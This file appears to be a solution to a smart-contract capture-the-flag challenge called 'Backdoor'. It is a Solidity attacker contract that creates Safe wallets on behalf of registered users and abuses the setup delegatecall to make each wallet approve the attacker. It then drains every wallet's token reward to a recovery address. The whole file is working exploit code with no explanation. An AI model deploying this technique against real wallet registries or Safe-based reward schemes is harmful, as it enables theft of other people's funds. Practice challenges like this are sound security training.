// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
contract BackdoorAttacker {
    constructor(){

    }

    function approveTokens(IERC20 erc20, address spender, uint256 amount) public{
        erc20.approve(spender, amount);
    }

    function execute(address[] memory users,address recovery, address singletonCopy, address walletFactory,address walletRegistry, address token) public {
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory initializer = abi.encodeWithSelector(Safe.setup.selector,owners, 1, address(this), abi.encodeWithSelector(this.approveTokens.selector, address(token), address(this), 10e18), address(0), address(0), 0, address(0));
            SafeProxyFactory(walletFactory).createProxyWithCallback(singletonCopy,initializer,0,IProxyCreationCallback( walletRegistry));

            IERC20(token).transferFrom(WalletRegistry(walletRegistry).wallets(users[i]), address (this), 10 * 10**18);

        }
        IERC20(token).transfer(recovery, 40 * 10**18);
    }
}
